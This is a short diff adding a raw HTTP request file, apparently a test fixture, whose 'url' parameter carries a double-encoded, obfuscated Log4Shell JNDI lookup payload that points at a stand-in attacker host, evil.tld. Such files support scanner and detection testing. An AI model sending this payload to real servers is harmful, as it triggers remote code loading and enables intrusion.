@@ -1,0 +1,4 @@
+GET /a?url=%2524%257Bjndi%253A%2524%257Blower%253Al%257Ddap%253A%252F%252Fevil.tld%252Fx%257D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
